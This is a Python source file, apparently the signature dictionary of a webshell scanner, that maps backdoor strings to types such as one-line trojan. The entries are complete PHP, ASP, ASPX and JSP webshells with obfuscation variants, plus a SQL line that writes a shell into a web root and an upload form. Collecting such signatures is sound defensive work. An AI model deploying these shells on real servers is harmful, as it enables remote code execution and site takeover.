#/usr/bin/env python
#coding=utf8

"""
    后门中包含的特有敏感字符
    自行手动添加各个类型后门到字典中，格式{"关键字":"类型"}
"""

#php敏感字符列表
php_sensitive_words = {
	"@preg_replace(":"一句话木马",
	'@system($_GET[':"一句话木马",
	"eval($_POST":"一句话木马",
	"@eval($_POST":"一句话木马",
	"$a=$_GET['a']; $t=$_GET['t']; $$a($_REQUEST[x])":"一句话木马",
	'<?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["sz"]); ?>':"一句话木马",
	"$lang = (string)key($_POST);$lang($_POST['sz']);":"一句话木马",
	'<?php $k="ass"."ert"; $k(${"_PO"."ST"} [':"一句话木马",
	'<?php if($_POST[x]!=''){$a="base64_decode"; eval($a($_POST[':"一句话木马",
	'<%a=request("gold")%><%eval a%>':"一句话木马",
	"<?php $a=range(1,200);$b=chr($a[96]).chr($a[114]).chr($a[114]).chr($a[100]).chr($a[113]).chr($a[115]);$b(${chr($a[94]).chr($a[79]).chr($a[78]).chr($a[82]).chr($a[83])}[chr($a[51])]);?>":"一句话木马",
	'"a"."s"."s"."e"."r"."t"':"一句话木马",
	"<?php assert($_POST[":"一句话木马",
	"<?$_POST['sa']($_POST['sb']);?>":"一句话木马",
	"<?$_POST['sa']($_POST['sb'],$_POST['sc'])?>":"一句话木马",
	"<O>h=@eval($_POST[":"一句话木马",
	"<script language='php'>@eval($_POST[":"一句话木马",
	"<?php $c='ass'.'ert';${c}($_POST[":"一句话木马",
	"<?php $k = str_replace('8','','a8s88s8e8r88t');$k($_POST[":"一句话木马",
	"<?php system($_REQUEST[":"一句话木马",
	"<?php @fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='));?>":"一句话木马",
	"<script language='php'>@fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='));</script>":"一句话木马",
	"<?php fputs (fopen(pack('H*','6c6f7374776f6c662e706870'),'w'),pack('H*','3c3f406576616c28245f504f53545b6c6f7374776f6c665d293f3e'))?>":"一句话木马",
	"<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>":"一句话木马",
	"<?php assert($_REQUEST[":"一句话木马",
	"www.r57.me":"恶意网址",
	"www.phpjm.net":"PHP加密后门",
	"<? echo file_get_contents('..//cfg_database.php');?> ":"一句话木马",
	'<? eval ( file_get_contents("远程shell")) ?>':"一句话木马",
	'<? md5($_GET["qid"])=="850abe17d6d33516c10c6269d899fd19"?array_map("asx73ert",(array)$_REQUEST["page"]):next;?>':"一句话木马",
	'<?php eval(str_rot13':"一句话木马",
	'<?php @include($_FILES["u"]["tmp_name"]);':"一句话木马",
	'<? @preg_replace("/f/e",$_GET["u"],"fengjiao"); ?>':"一句话木马",
	'<?php $s=@$_GET[2];if(md5($s.$s)=="e67c2597ecad64bb4cdad6633b04107f")@eval($_REQUEST[$s]); ?>':"一句话木马",
	'<?php array_map("ass\x65rt",(array)$_REQUEST["expdoor"]);?>':"一句话木马",
	'<?php $x=base64_decode("YXNzZXJ0");$x($_POST':"一句话木马",
	'<?php call_user_func(create_function(null,"assert($_POST':"一句话木马"
	#'':"一句话木马",
	#'':"一句话木马",
}

asp_sensitive_words = {
	'<%Y=request("xindong")%> <%execute(Y)%>':"一句话木马",
	'<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("xindong"))%>':"一句话木马",
	'<%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")")%>':"一句话木马",
	'<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>':"一句话木马",
	'<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>':"一句话木马",
	'<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"])  ); }%>':"一句话木马",
	'<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>':"一句话木马",
	'<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>':"一句话木马",
	'< %@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>':"一句话木马",
	'<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"]) ); }%>':"一句话木马",
	'<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>':"一句话木马",
	'<%eval request("sb")%>':"一句话木马",
	'<%execute request("sb")%>':"一句话木马",
	'<%execute(request("sb"))%>':"一句话木马",
	'<%execute request("sb")%><%"<% loop <%:%>':"一句话木马",
	'<script language=vbs runat=server>eval(request("sb"))':"一句话木马",
	'%><%Eval(Request(chr(35)))%><%':"一句话木马",
	'<%eval request("sb")%>':"一句话木马",
	'<%eval_r(Request("0x001"))%>':"一句话木马",
	'<%ExecuteGlobal request("sb")%>':"一句话木马",
	'<% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>':"一句话木马",
	'<%eval request("sb")%>':"一句话木马",
	'<%execute request("sb")%>':"一句话木马",
	'%><%Eval(Request(chr(35)))%><%':"一句话木马",
	'<%ExecuteGlobal request("sb")%>':"一句话木马",
	' <%execute(strreverse(")""xx""(tseuqer lave"))%>':"一句话木马",
	'<%eval("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0″&"-"&"2″&"-"&"5″&")"&")")%>':"一句话木马",
	'<% Function d(s):d=Mid(love,s,1):End Function:love="(tqxuesrav l)"&"""":execute(d(6)&d(10)&d(9)&d(12)&d(11)&d(8)&d(6)&d(3)&d(5)&d(6)&d(7)&d(2)&d(1)&d(14)&d(4)&d(4)&d(14)&d(13)) %>':"一句话木马",
	'```<%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("sz"))%>```':"一句话木马"
	
	
}

aspx_sensitive_words = {
	'<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>':"一句话木马"
}

jsp_sensitive_words = {
	'<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("//")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%> ':"一句话木马",
	"select '<?php eval($_POST[cmd];?>' into outfile 'C:/Inetpub/wwwroot/mysql-php/1.php'":"一句话木马",
	"<% if(request.getParameter('f')!=null)(new java.io.FileOutputStream(application.getRealPath('\\')+request.getParameter('f'))).write(request.getParameter('t').getBytes());%>":"一句话木马",
	'<form action="http://59.x.x.x:8080/scdc/bob.jsp?f=fuckjp.jsp" method="post">< textarea name=t cols=120 rows=10 width=45>your code</textarea><BR><center><br>< input type=submit value="提交">< /form>':"一句话木马"
}

all_sensitive_words = {
}
